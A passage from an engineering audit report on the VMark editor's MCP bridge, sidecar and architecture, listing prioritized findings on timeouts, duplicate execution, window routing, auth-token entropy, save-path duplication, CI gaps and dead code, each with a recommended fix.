**Recommendation:** Move the read-only check into the v2 handlers after tab resolution: call isDocReadOnly(resolved.tabId) (already exported from readOnlyGuard.ts) in handleDocumentWrite, handleDocumentTransform, handleWorkflowApplyPatch, and handleSelectionSet, and drop the active-doc pre-gate in handleRequest.ts (selection.set already constrains to the focused tab, so it can keep the active check). Add tests for the background-tab read-only case.

### #46 · P1/S · Sidecar request timeout (10s) is shorter than the Rust bridge's wake+retry window (20s) — writes report failure to the AI but still apply

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `vmark-mcp-server/src/bridge/websocket.ts:155`
- `vmark-mcp-server/src/cli.ts:450`
- `src-tauri/src/mcp_bridge/server.rs:670`

**Evidence:** websocket.ts:155 defaults `timeout` to 10000ms (comment at :61 says 'aligned with Rust bridge timeout') and cli.ts:450-460 never overrides it, so sendImmediate (websocket.ts:563-565) rejects with 'Request timeout' at exactly 10s. The Rust side waits 10s (server.rs:670), then wakes the webview and waits ANOTHER 10s (server.rs:744) — total 20s — and on a write op holds the global WRITE_LOCK the whole time. Any operation completing between 10s and 20s (large-doc parseMarkdown, actionlint validation, App-Nap wake) succeeds in VMark while the AI client already received a timeout error; the late response is dropped as 'Received response for unknown request' (websocket.ts:650). The AI then retries, double-applying non-idempotent operations (workspace.new creates a second tab, checkpoints duplicate). Multi-client write contention makes this worse: the Rust 10s timer starts only after the WRITE_LOCK is acquired, while the sidecar's timer starts at send.

**Recommendation:** Make the sidecar timeout strictly greater than the bridge's worst-case window: set `timeout: 25000` in cli.ts's WebSocketBridge config (or compute it as RUST_TIMEOUT*2 + margin and document the invariant in both files). 'Equal' timeouts guarantee the client always expires first.

### #47 · P1/S · Bridge timeout-retry re-emits the same request to a live webview — slow handlers execute twice

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src-tauri/src/mcp_bridge/server.rs:682`
- `src/hooks/mcpBridge/index.ts:77`

**Evidence:** On first timeout server.rs:682-744 re-emits the identical McpRequestEvent (same id, same args) to the target window regardless of whether the webview is actually suspended — it logs `webview_was_alive` (server.rs:686-691, fed by the 5s heartbeat in hooks/mcpBridge/index.ts:71-75) but retries anyway. The frontend listener (index.ts:77-117) has no request-id dedup, so a handler that is merely slow (>10s) runs a second time concurrently with the first: vmark.workspace.new creates two tabs, document.write records duplicate checkpoints and bumps the revision twice, workflow.apply_patch can apply patches twice. Whichever respond() lands first resolves the replaced pending channel; the other is silently dropped.

**Recommendation:** Two small changes, either sufficient: (1) only wake+retry when the heartbeat says the webview is stale (is_webview_alive() == false) — the data is already tracked; and/or (2) keep a small TTL set of in-flight/processed request ids in the frontend listener and drop duplicate emissions of the same id.

### #48 · P1/M · Multi-window MCP addressing is broken: v2 requests never carry windowId, so all requests run in the focused webview's isolated stores — phantom tabs created with success responses

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `vmark-mcp-server/src/bridge/core-types.ts:27`
- `src-tauri/src/mcp_bridge/server.rs:435`
- `src/hooks/mcpBridge/v2/workspace.ts:56`
- `src/hooks/mcpBridge/v2/session.ts:59`

**Evidence:** resolve_target_window (server.rs:435-462) routes by `args.windowId`, but none of the 15 BridgeRequest variants in core-types.ts includes windowId (only `windowLabel`, which Rust ignores) — so every v2 request is emitted to the focused/main webview. Each Tauri window is a separate JS heap with its own Zustand stores (no BroadcastChannel/emit sync exists in tabStore.ts — verified by grep). Consequences: (a) vmark.workspace.new with windowLabel:"doc-2" executing in the main webview calls tabStore.createTab("doc-2") on MAIN's store (workspace.ts:56-71) — returns success {tabId} for a tab the real doc-2 window will never see; (b) session.get_state's 'every window, every tab' promise (sidecar tools/session.ts:20-23) only reflects the focused webview's local tabState.tabs (frontend session.ts:65); (c) document.write/read with a tabId owned by another window returns INVALID_TAB because resolveTab can't find it in the local store.

**Recommendation:** Route in Rust by window: have the sidecar forward windowLabel as windowId (or have resolve_target_window also honor `windowLabel`), and for tabId-addressed ops include the owning window label (available from session.get_state) in the request. Aggregate session.get_state across windows on the Rust side (it already has windows.list machinery) or document the surface as focused-window-only and reject foreign windowLabel args with a structured error instead of silently corrupting local store state.

### #49 · P2/S · Synchronous Rust-side failures (target window gone, pending-queue full, bad payload) are only logged — the AI client burns the full 10s timeout instead of getting an instant structured error

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src-tauri/src/mcp_bridge/server.rs:351`
- `src-tauri/src/mcp_bridge/server.rs:619`
- `src-tauri/src/mcp_bridge/server.rs:656`

**Evidence:** handle_message returns Err(String) for: invalid message format (server.rs:513-514), pending-map cap exceeded (619-624), target window not found (656-659), and emit failure (661-667). The caller at server.rs:351-354 only does log::error! — no response is sent to the sidecar, whose pending request then sits until its own 10s timeout fires with the generic 'Request timeout: <type>'. send_error_response already exists (server.rs:472-503) and is used on the timeout paths, so the immediate-failure paths are strictly worse-informed than the slow ones.

**Recommendation:** In the Err arms reachable after the client is known, call send_error_response with the specific message (e.g. "Target window 'doc-3' not found") instead of returning Err; reserve the bare Err/log path for failures before the client tx is resolvable.

### #50 · P2/S · Sidecar permanently gives up after 30 failed reconnects and send() never re-kicks the loop — a VMark crash longer than ~20 minutes bricks the AI session until the client restarts

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `vmark-mcp-server/src/bridge/websocket.ts:495`
- `vmark-mcp-server/src/bridge/websocket.ts:719`
- `vmark-mcp-server/src/cli.ts:455`

**Evidence:** If VMark crashes, the stale port file remains, so each connect attempt gets ECONNREFUSED and COUNTS against maxReconnectAttempts=30 (cli.ts:455; only port-file-missing polls are exempted via the savedAttempts dance at websocket.ts:309-311). After exhaustion, scheduleReconnect logs 'Giving up' and drains the queue (websocket.ts:721-731). send() (websocket.ts:495-507) then throws 'Not connected to VMark' forever — it never resets reconnectAttempts or initiates a lazy reconnect, even after the user restarts VMark and a fresh port file exists. Long-lived Claude Code/Codex sessions hit this; the only recovery is restarting the AI client. The error string also gives the AI no recovery guidance.

**Recommendation:** In send(), when disconnected and not connecting and autoReconnect is on, reset reconnectAttempts and trigger one connect() attempt before failing (a new tool call is strong evidence the user wants the connection back). Also enrich the error: 'Not connected to VMark — is the app running? Retrying connection now; retry this tool call in a few seconds.'

### #51 · P2/S · MCP bridge auth token generated via SipHash/RandomState with related keys, not a CSPRNG

**Status:** finder-evidence (not adversarially cross-checked) · same root cause as #40

**Files:**
- `src-tauri/src/mcp_bridge/state.rs:111`

**Evidence:** generate_auth_token (state.rs:111-126) builds the 64-hex token from 4× RandomState SipHash of the process id. std's RandomState::new() seeds once per thread and then increments one key per instantiation, so the four u64 words are SipHash-1-3 outputs of a constant input under related keys (k0+i, k1) — effective entropy ≤128 bits with structure outside SipHash's PRF design claims. The token is the only thing standing between any local process (or a malicious web page doing ws://127.0.0.1 port-scanning, since accept_async does no Origin check) and a full document read/write surface. getrandom is already in Cargo.lock (transitive), so the 'no new dependency' rationale in the doc comment no longer holds weight.

**Recommendation:** Add getrandom as a direct dependency and fill 32 random bytes → hex (≈6 lines). Keep the existing 64-hex format so the sidecar parser is untouched. Optionally also check the WebSocket handshake's Origin header and reject browser-originated connections outright.

### #52 · P2/S · document.transform never persists to disk and its response carries no saved/dirty signal — inconsistent with document.write's save-by-default contract

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src/hooks/mcpBridge/v2/document.ts:428`
- `vmark-mcp-server/src/tools/document.ts:23`

**Evidence:** handleDocumentWrite persists to disk by default with structured saved/save_skipped/save_error fields (v2/document.ts:324-363), explicitly because 'the buffer-vs-disk distinction has no business in the AI's reasoning loop' (file header, lines 22-30). handleDocumentTransform (v2/document.ts:428-496) applies the CJK rewrite to the buffer only — no writeTextFile, no markSaved — and responds with just {revision}. The sidecar tool description for `transform` (tools/document.ts:23) is silent on persistence. An AI that runs transform and reports 'formatted and saved' leaves the file dirty on disk; per the project's own ADR-2 rationale this is exactly the trap that taught agents to bypass MCP and write files directly.

**Recommendation:** Mirror the write path: add the same save-by-default block (with save?: boolean arg and saved/save_skipped/save_error response fields) to handleDocumentTransform, extend the sidecar schema/description, and add the wire type's save semantics to the tool description.

### #53 · P2/S · vmark-mcp-server test suite is not executed by any CI workflow

**Status:** finder-evidence (not adversarially cross-checked) · same root cause as #68, #78

**Files:**
- `.github/workflows/ci.yml:143`
- `vitest.config.ts:11`
- `vmark-mcp-server/package.json:14`

**Evidence:** Root vitest only includes 'src/**/*.{test,spec}...' (vitest.config.ts:11), so `pnpm check:all` (package.json:36) never touches vmark-mcp-server/__tests__/ (unit/bridge, unit/server.test.ts, utils/McpTestClient — they have their own vitest config and `test` script at vmark-mcp-server/package.json:14). ci.yml's only mention of the sidecar is `touch src-tauri/binaries/vmark-mcp-server-${triple}` (line 143, a build stub); release.yml builds and health-checks the binary but does not run the suite. The reconnect/auth/queue logic audited above (websocket.ts, 778 lines) is precisely the code those tests cover — regressions there ship silently.

**Recommendation:** Add `pnpm --filter vmark-mcp-server test` (or `pnpm -C vmark-mcp-server test`) as a step in the ci.yml frontend job, and consider chaining it into check:all so local gates match CI.

### #54 · P3/S · Sidecar 'legacy no-token' connect mode is dead-on-arrival against the mandatory-auth bridge — produces a confusing reconnect storm instead of a clear version-mismatch error

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `vmark-mcp-server/src/bridge/websocket.ts:402`
- `src-tauri/src/mcp_bridge/server.rs:283`

**Evidence:** When the port file lacks a token (old/corrupt file), websocket.ts:402-413 marks the bridge connected immediately and sends `identify` first. The Rust bridge rejects any non-auth first message (server.rs:283-289 → return Ok(false)) and disconnects. The sidecar's auth_result handler finds _authReject null (legacy path never set it) and ignores the failure (websocket.ts:628-641), so the client sees 'connected' → requests fail with 'Connection lost' → reconnect loop burns its 30 attempts, never surfacing the actual cause. write_port_file always writes `{port}:{token}` (state.rs:131-151), so the tokenless format only occurs as stale/foreign state — exactly when a loud error is most useful.

**Recommendation:** Delete the legacy branch: when authTokenResolver returns undefined, fail connect() with an explicit error ('VMark port file has no auth token — stale file or version mismatch; restart VMark or delete <path>/mcp-port') instead of connecting unauthenticated.

### #55 · P3/S · is_read_only_operation still allowlists ~25 legacy operation types the frontend no longer handles

**Status:** finder-evidence (not adversarially cross-checked) · same root cause as #60, #69, #80

**Files:**
- `src-tauri/src/mcp_bridge/state.rs:181`

**Evidence:** state.rs:181-229 classifies legacy v1 types (document.getContent, outline.get, structure.getAst/getDigest/listBlocks/resolveTargets/getSection, protocol.*, genies.list/read, tabs.getActive, etc.) as read-only, and the exhaustive write-op test (state.rs:353-460) preserves ~60 more dead strings. dispatchV2 (src/hooks/mcpBridge/v2/dispatch.ts:61-117) routes only the 15 vmark.* types; everything else gets the #900 'Unknown request type' error. The dead entries cost nothing at runtime but actively mislead maintenance — the file presents itself as the wire-contract mirror of core-types.ts (the comment at :221-223 says so), and 3 of its 4 sources of truth are fiction.

**Recommendation:** Prune the allowlist and the test inventory to the 15 live vmark.* types (4 reads, 11 writes), and add a comment pointing at core-types.ts + dispatch.ts as the two peers that must stay in sync — making the real three-file coupling reviewable at a glance.

### #56 · P3/S · Anthropic model list is hardcoded and stale; Anthropic's real /v1/models endpoint is unused, and the default model id is duplicated in two files

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src-tauri/src/ai_provider/rest_api.rs:260`
- `src-tauri/src/ai_provider/mod.rs:134`

**Evidence:** list_models returns a curated two-entry list for Anthropic (rest_api.rs:260-263: claude-sonnet-4-5-20250929, claude-haiku-4-5-20251001) with the comment 'no listing endpoint' — but Anthropic has shipped GET /v1/models (the same x-api-key auth used elsewhere in this file). The fallback default 'claude-sonnet-4-5-20250929' is also independently hardcoded in dispatch_to_provider (mod.rs:134) and in test_api_key's probe body (rest_api.rs:167). As model generations roll, users with valid keys see an outdated picker while OpenAI/Google/Ollama users get live lists.

**Recommendation:** Implement Anthropic list_models via GET {base}/v1/models (paginated `data[].id`), mirroring the OpenAI arm, and hoist the default model id into one shared constant used by mod.rs and rest_api.rs.

## Architecture and module boundaries

Duplicated save paths, drifted WYSIWYG/source twins, stalled migrations, and the untyped TS-Rust command boundary.

### #57 · P1/M · MCP bridge re-implements file saving three times, bypassing the canonical saveToPath service (non-atomic writes, no normalization, no history snapshot)

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src/hooks/mcpBridge/v2/document.ts:336`
- `src/hooks/mcpBridge/v2/workspace.ts:167`
- `src/hooks/mcpBridge/v2/workspace.ts:242`
- `src/services/persistence/saveToPath.ts:74`

**Evidence:** saveToPath.ts documents itself as the single save path: it normalizes line endings/hard breaks per settings (lines 81-90), writes via the Rust `atomic_write_file` command (temp+fsync+rename, line 97), parses the PARENT_MISSING sentinel and calls markMissing (lines 105-119), delays clearPendingSave by 1000ms to swallow the debounced FSEvents echo (line 148), updates recent files, and creates a file-history snapshot (lines 158-173). The three MCP handlers — handleDocumentWrite (document.ts:336-352), handleWorkspaceSave (workspace.ts:167-175), handleWorkspaceSaveAs (workspace.ts:242-258) — each hand-roll persistence with plain `writeTextFile` from @tauri-apps/plugin-fs (non-atomic), apply no line-ending/hard-break normalization, skip the history snapshot and PARENT_MISSING handling, and clear the pending-save entry synchronously in `finally` (vs. the 1000ms delay the comment in saveToPath says is needed because the watcher pipeline 'can exceed 500ms under heavy I/O'). Net effect: AI-driven saves produce different on-disk bytes than a user ⌘S, lose crash-atomicity, never appear in the HistoryView snapshot timeline, and lean on a secondary lastDiskContent comparison instead of the pendingSaves fast path to suppress watcher echo.

**Recommendation:** Route all three MCP save sites through saveToPath() (hooks may import services per ADR-013). Add an options parameter to saveToPath (e.g. notify: 'toast' | 'silent') so MCP callers get a structured error return instead of toasts, and keep the existing saved/save_skipped/save_error response shape in the handlers. Delete the inline writeTextFile + registerPendingSave blocks once routed.

### #58 · P1/S · Markdown serializer silently drops unknown ProseMirror nodes and no gate ties converter coverage to the real assembled schema

**Status:** finder-evidence (not adversarially cross-checked) · same root cause as #77

**Files:**
- `src/utils/markdownPipeline/proseMirrorToMdast.ts:174`
- `src/utils/markdownPipeline/testSchema.ts`
- `src/services/assembly/tiptapExtensions.ts`

**Evidence:** convertNode()'s default case (proseMirrorToMdast.ts:174-178) returns null with only a dev-mode `mdPipelineWarn` — the node's content vanishes from the serialized markdown, which is the document's source of truth, so the user's data is destroyed on the next save. All pipeline tests import the hand-maintained `testSchema` (testSchema.ts), not the schema produced by the real extension set in services/assembly/tiptapExtensions.ts; the only test referencing the unknown-node path asserts the warning fires (proseMirrorToMdast.test.ts:144). Nothing fails CI when someone adds a Tiptap Node in assembly (e.g. via a new plugin like blockImage/tiptap.ts Node.create) without adding both converters — the documented 'lossy-by-omission' failure mode is unguarded against the schema that actually ships.

**Recommendation:** Add one parity test that builds the real schema (Tiptap's getSchema() over the assembled extension list from tiptapExtensions.ts), enumerates schema.spec.nodes, and asserts every node name is in an exported HANDLED_NODE_TYPES list shared with proseMirrorToMdast.ts's switch (plus an explicit exempt list for editor-only nodes, each with a justification comment). Mirror the same check for the mdast→PM direction. This converts silent data loss into a red CI run.

### #59 · P1/M · WYSIWYG/source popup twins have drifted: source-mode link popup cannot open file-path links (treats everything non-# as an external URL)

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src/plugins/sourceLinkPopup/sourceLinkActions.ts:98`
- `src/plugins/linkPopup/LinkPopupView.ts:188`
- `src/utils/linkOpen.ts`

**Evidence:** The WYSIWYG popup's handleOpen (LinkPopupView.ts:188-224) classifies the href via classifyHref() into fragment/external/filepath and opens file-path links in a tab via openFilepathLink() resolved against the active document. The source-mode twin's openLink (sourceLinkActions.ts:98-132) handles only `#` fragments and pipes everything else to plugin-opener `openUrl` — a relative path like ./notes.md never opens in a tab in Source Mode. The twins also diverge on clipboard (navigator.clipboard.writeText at LinkPopupView.ts:230 vs Tauri plugin writeText at sourceLinkActions.ts:145) and on the save button (WYSIWYG has one, source popup does not). This is the concrete cost of the 6 hand-duplicated popup twin pairs (link, linkCreate, image, math, footnote, wikiLink) each rebuilding DOM + handlers on two unrelated base classes (plugins/shared/WysiwygPopupView.ts, plugins/sourcePopup/SourcePopupView.ts).

**Recommendation:** Short term: port the classifyHref/openFilepathLink branch into sourceLinkActions.openLink and unify the clipboard call — both are leaf utils already shared. Structurally: extract per-feature mode-agnostic action modules (open/copy/buildMarkdown) that both views consume, so the twin views only own DOM + editor dispatch; do one pair (link) as the template before touching the other five.

### #60 · P2/M · MCP wire contract is string-tripled across sidecar TS, frontend TS, and Rust — and the Rust read-allowlist still carries ~22 dead legacy operation strings

**Status:** finder-evidence (not adversarially cross-checked) · same root cause as #55, #69, #80

**Files:**
- `vmark-mcp-server/src/bridge/core-types.ts:27`
- `src/hooks/mcpBridge/v2/dispatch.ts:53`
- `src-tauri/src/mcp_bridge/state.rs:181`

**Evidence:** The 15 `vmark.*` request types are hand-maintained in three places with no codegen or parity gate: the BridgeRequest union (core-types.ts:27-62), the dispatch switch (dispatch.ts:64-110), and `is_read_only_operation` (state.rs:181-229). A new read op missing from state.rs silently serializes all AI clients through the global WRITE_LOCK (the comment at state.rs:220-223 documents exactly this regression). Additionally, state.rs:184-219 still allowlists ~22 legacy types (`document.getContent`, `structure.getAst`, `genies.list`, `paragraph.read`, `protocol.*`, …) that the frontend dispatcher no longer handles — dead strings that mislead readers about the live surface. The repo already has the right pattern for this: scripts/check-ext-sync.sh CI-checks SUPPORTED_EXTENSIONS parity between Rust and TS, and scripts/extract-menu-ids.ts generates src/shared/menu-ids.json that actionRegistry.ts validates against.

**Recommendation:** Move the wire-type list (name + read/write classification) into one machine-readable source — e.g. a JSON in the existing pnpm workspace consumed by core-types.ts and dispatch.ts, with a check-ext-sync-style script asserting state.rs's matches! arms equal it. Delete the dead legacy arms from is_read_only_operation in the same change (their tests at state.rs:264+ pin obsolete behavior).

### #61 · P2/M · ADR-013 'utils must be leaf-pure' is unenforced for the Tauri/services axis — 16 utils files import @tauri-apps/* or services and dependency-cruiser cannot see it

**Status:** finder-evidence (not adversarially cross-checked) · same root cause as #72

**Files:**
- `.dependency-cruiser.cjs:24`
- `src/utils/clipboardImagePath.ts:8`
- `src/utils/safeStorage.ts:13`
- `src/utils/pdfExportWindow.ts:18`

**Evidence:** AGENTS.md (lines 155-162) states: 'If you find yourself adding useXStore or @tauri-apps/* imports inside utils/, the file belongs in services/.' But the depcruise leaf-modules rule only forbids utils → src/(plugins|components|stores) — imports of @tauri-apps packages and @/services are invisible to it. Verified offenders: clipboardImagePath.ts, crashRecovery.ts, errorDialog.ts, imageHashRegistry.ts, largeFilePrompts.ts, linkOpen.ts, orphanAssetCleanup.ts, pdfExportWindow.ts, settingsWindow.ts, secureStorage.ts, debug.ts + debug/{error,warn,internals}.ts (all Tauri), plus safeStorage.ts:13 and workspaceStorage.ts:20 importing @/services/ime/imeToast. The drift is acknowledged in dev docs but has no ratchet, so it grows.

**Recommendation:** Add a depcruise rule: from ^src/utils/ to node_modules @tauri-apps and ^src/services/, severity error, seeded with the current 16 files as a named pathNot exemption list (matching the existing leaf-modules-stay-pure exemption style). Then burn the list down by relocating files to services/ in mechanical follow-ups — errorDialog/largeFilePrompts/settingsWindow/pdfExportWindow are pure relocations with import-path updates.

### #62 · P2/S · ADR-011 plugin registry is write-only: 75 manifest.ts files registered at startup with zero runtime consumers and no accuracy check

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src/plugins/manifests.ts`
- `src/plugins/registry.ts:1`
- `src/main.tsx:37`

**Evidence:** main.tsx:37 calls registerAllPlugins(), which imports and registers 75 per-plugin manifest.ts files into a module Map. Grep across src/ finds no caller of listPlugins()/getPlugin() outside registry.ts, manifests.ts, and tests — the promised consumers (registry.ts header: 'debug page, command palette, documentation generation') do not exist. The real composition is hand-rolled in services/assembly/tiptapExtensions.ts and sourceEditorExtensions.ts, which never reference the registry. Result: 75 metadata files whose modes/formats/slots claims are never validated against the actual assembly, so they can drift silently (manifests are typed as `PluginManifest` only; e.g. linkPopup/manifest.ts declares modes ['wysiwyg','source'] purely on faith).

**Recommendation:** Smallest complete fix: add a parity test asserting (a) every plugin directory wired in services/assembly/* and editorPlugins.tiptap.ts has a registered manifest and (b) each manifest's declared modes match where assembly actually mounts it. If the team won't ship the first real consumer soon, also drop the registerAllPlugins() call from main.tsx (keep it test-only) so production stops paying for metadata nothing reads.

### #63 · P2/M · T09 popup-store consolidation stalled at zero adoption — all consumers still import the 15 legacy shim stores; the merged popupStore has no direct consumers

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src/stores/popupStore.ts:1`
- `src/stores/_shimHelper.ts:1`
- `src/stores/linkPopupStore.ts:12`

**Evidence:** popupStore.ts merges 15 popup stores into namespaced slices with prefix-renamed actions (linkOpenPopup, linkClosePopup, …). Verified by grep: 0 non-test files outside src/stores import stores/popupStore directly, while ~75 import sites still go through the 15 shim files (mediaPopupStore 14, linkPopupStore 8, imagePasteToastStore 7, wikiLinkPopupStore 7, …), each a createSliceShim() projection through a WeakMap merge cache (_shimHelper.ts). Every popup now has two public APIs (shim with original action names + popupStore with prefixed names) spread over three files (popupStore.ts actions, popupStore/slices.ts types, the shim), and the prefixed action surface exists solely to feed the shims.

**Recommendation:** Decide the end state and close the gap: either (a) declare the shims the permanent API — then document that in popupStore.ts's header and stop treating shim imports as 'legacy', or (b) finish the migration with a mechanical codemod (useLinkPopupStore → usePopupStore selector on state.linkPopup + prefixed actions), delete the 15 shim files and _shimHelper.ts. Option (b) removes an entire indirection layer and ~16 files; it is AI-mechanical work.

### #64 · P2/M · src-tauri/src/lib.rs is a 1375-line catch-all mixing the composition root with four unrelated command domains

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src-tauri/src/lib.rs:96`
- `src-tauri/src/lib.rs:329`
- `src-tauri/src/lib.rs:342`

**Evidence:** Beyond the unavoidable builder + generate_handler block (run() spans lines 567-1027), lib.rs inlines distinct domains that each have an obvious module home: the Finder/CLI file-open queue + FILE_OPEN_STATE static (lines 90-191), temp-HTML write + stale-temp cleanup + atomic_write_file (lines 205-341 — the project's single durable-write primitive, buried in the bootstrap file), login-shell discovery for three platforms (lines 342-538, including getpwuid_r logic), register_dock_recent and machine_id_hash (539-566), plus ~350 lines of tests (1028-1375). The project's own convention (AGENTS.md: 'Keep code files under ~300 lines (split proactively)') is exceeded 4.5x, and existing sibling modules (file_ops.rs, app_paths.rs) show where these belong.

**Recommendation:** Extract three modules with their tests: fs_write.rs (atomic_write_file + write_temp_html + cleanup_stale_temp_files), shell.rs (get_default_shell/get_login_shell_path/list_available_shells + passwd/Windows resolution), and file_open.rs (FILE_OPEN_STATE, get_pending_file_opens, filter_supported_args). lib.rs keeps only module decls, plugin wiring, generate_handler, and run(). Pure mechanical move — no behavior change, existing tests relocate verbatim.

### #65 · P2/L · No typed TS↔Rust command boundary: 78 raw invoke() call sites with string literals and per-site type assertions, including direct calls from components

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src/components/Sidebar/FileExplorer/useFileTree.ts:50`
- `src/components/StatusBar/tabTransferActions.ts:103`
- `src-tauri/src/lib.rs:623`

**Evidence:** The Rust side exposes ~92 commands in one generate_handler! (lib.rs:623-716). The frontend reaches them through 78 invoke() call sites across ~45 files in every layer — services, hooks, stores (workspaceStore.ts, uiStore.ts:555, aiStore), utils, and components (useFileTree.ts:50 `invoke<DirectoryEntry[]>("list_directory_entries", …)`, tabTransferActions.ts:103). Each site re-declares the command name as a string literal and asserts the return type locally (`invoke<string | null>`), so a renamed command or changed Rust signature compiles clean on both sides and fails only at runtime. The repo already maintains parity gates for two other TS↔Rust contracts (scripts/check-ext-sync.sh for extensions, scripts/extract-menu-ids.ts → src/shared/menu-ids.json for menu IDs) — the largest contract, the command surface itself, has none.

**Recommendation:** Adopt tauri-specta to generate a typed bindings module from the command definitions (mechanism it beats hand-rolling: types and names are derived from the Rust signatures, so drift is a compile error). If the dependency is unwanted, the in-convention alternative is an extract-command-ids script mirroring extract-menu-ids.ts plus one thin `src/services/tauri/commands.ts` wrapper that owns all names/types, with a lint forbidding invoke() outside it.

### #66 · P3/S · MCP sidecar reimplements Tauri's app_data_dir() path convention in TypeScript to find the port file

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `vmark-mcp-server/src/cli.ts:136`
- `src-tauri/src/mcp_config/config_io.rs:97`
- `src-tauri/src/app_paths.rs:19`

**Evidence:** cli.ts getAppDataDir() (lines 136-157) hand-duplicates Tauri's per-OS app-data layout (darwin/linux/win32 branches keyed on APP_IDENTIFIER 'app.vmark') to locate the mcp-port file that Rust writes. Any change to the bundle identifier or Tauri's path resolution silently breaks sidecar discovery on whichever OS drifts. Meanwhile the installer that generates the AI-client config entry (config_io.rs:97-98, 116) writes only `{"command": <binary path>}` — VMark, which knows the exact port-file path, passes nothing to the sidecar (only a VMARK_APP_IDENTIFIER env override exists, cli.ts:117).

**Recommendation:** Have mcp_config write the resolved port-file path into the generated server entry (env VMARK_PORT_FILE or an args entry). Sidecar prefers it and keeps getAppDataDir() as fallback for hand-written configs. One Rust function + one TS branch + tests.

### #67 · P3/M · plugin-isolation dependency rule is mostly exemptions: 26 of ~90 plugin dirs are exempt and the rule is warn-only

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `.dependency-cruiser.cjs:67`

**Evidence:** Rule 4 ('Plugins should be self-contained') is severity warn and its from.pathNot exempts 26 plugin directories — 7 labeled coordination plugins plus 19 ad-hoc 'verified cross-plugin dependencies' (tabIndent, blockEscape, blockImage, sourcePeekInline, four source*Popup twins, markdownArtifacts, htmlPaste, markdownPaste, aiSuggestion, mathPopup, mathPreview, mermaidPreview, latex, shared, …). With a third of src/plugins (~200k LOC) outside the rule and violations non-failing, the isolation invariant the rule claims to protect is effectively unenforced; the exemption list only grows (three entries carry fresh justification comments for recent additions).

**Recommendation:** Ratchet instead of aspire: for each non-coordination exemption, either move the shared symbol into plugins/shared/ (e.g. the katexLoader sourceMathPopup reaches for, the operations module sourceLinkCreatePopup imports from its sibling) or document it as a permanent coordination plugin. Target: cut the ad-hoc list below 10, then flip severity to error so new cross-plugin reaches fail CI.

## Code health

Dead code, decorative lint gates, convention drift. Several are one-line CI flips with immediate payoff.

### #68 · P1/S · MCP sidecar's test and lint suites are never executed by any quality gate

**Status:** finder-evidence (not adversarially cross-checked) · same root cause as #53, #78

**Files:**
- `vitest.config.ts:11`
- `package.json:36`
- `.github/workflows/ci.yml:51`
- `vmark-mcp-server/package.json:14`

**Evidence:** Root vitest.config.ts:11 includes only `src/**/*.{test,spec}...`, so the 6+ test files under vmark-mcp-server/__tests__/{unit,mocks,utils} never run via `pnpm test:coverage`. package.json:36 `check:all` chains only root scripts (`pnpm lint` = `eslint src`), and ci.yml's only reference to the sidecar is `touch src-tauri/binaries/vmark-mcp-server-${triple}` (line 143, a build stub). The sidecar has its own `test`/`test:coverage`/`lint` scripts (vmark-mcp-server/package.json:14-17) that nothing invokes. This matters because the MCP wire contract is string-literal-coupled in three places with no codegen (vmark-mcp-server/src/bridge/core-types.ts:28-60, src/hooks/mcpBridge/v2/dispatch.ts:53-59, src-tauri/src/mcp_bridge/state.rs:181-229) — the sidecar tests are the only automated guard on one of those three legs, and they are dead from CI's perspective.

**Recommendation:** Wire `pnpm --filter vmark-mcp-server run test` (and its `lint`) into `check:all` or as a CI step in ci.yml's frontend job. One added script segment; no test changes needed.

### #69 · P2/S · 24 dead legacy wire-type strings in is_read_only_operation, locked in by tests

**Status:** finder-evidence (not adversarially cross-checked) · same root cause as #55, #60, #80

**Files:**
- `src-tauri/src/mcp_bridge/state.rs:181`
- `src-tauri/src/mcp_bridge/state.rs:264`
- `src/hooks/mcpBridge/handleRequest.ts:50`
- `vmark-mcp-server/src/bridge/core-types.ts:28`

**Evidence:** state.rs:184-219 allowlists `document.getContent`, `document.search`, `selection.get`, `cursor.getContext`, `outline.get`, `metadata.get`, `workspace.*` (3), `tabs.*` (3), `editor.getUndoState`, `suggestion.list`, `paragraph.read`, `protocol.*` (2), `structure.*` (5), `genies.*` (2) — 24 strings total. The sidecar's BridgeRequest union (core-types.ts:28-60) contains only `vmark.*` types, and the frontend router (handleRequest.ts) rejects everything dispatchV2 doesn't match with `Unknown request type`. Only `windows.list`/`windows.getFocused` (Rust fast paths at server.rs:833/858) and the four `vmark.*` reads are live. Tests at state.rs:264-320 assert the dead strings, cementing the illusion that e.g. `structure.getAst` is a live read op. A maintainer adding a new read op could reasonably copy the dead naming style and miss the `vmark.*` prefix entirely.

**Recommendation:** Delete the 24 legacy strings from the matches! block, keep `windows.list`/`windows.getFocused` + the `vmark.*` entries, and update the tests to assert the dead types are now classified as writes (safe-by-default). Add a comment pointing at core-types.ts as the only source of wire types.

### #70 · P2/M · knip exports rules are warn-only: 231 dead exports/types accumulated, plus a test-as-entry blind spot hiding production-dead code

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `knip.json:9`
- `src/export/resourceResolver.ts:441`
- `knip.json:18`

**Evidence:** knip.json:9-14 sets `exports`, `nsExports`, `types`, `nsTypes`, `duplicates` to "warn", so `pnpm knip` inside check:all passes while a live run reports 22 unused exports and 209 unused exported types (verified by running `pnpm exec knip`). knip also self-reports two stale config entries (`mermaid` in website ignoreDependencies, `vitepress` in ignoreBinaries). Separately, knip.json:18-23 registers all test files as entry points, which makes any production export referenced only by its own test invisible: `resourceResolver.ts:441 formatFileSize` has zero production call sites (verified by grep — only resourceResolver.test.ts:83+ uses it) yet knip does not flag it. Test-only production exports also inflate the razor-thin coverage ratchet.

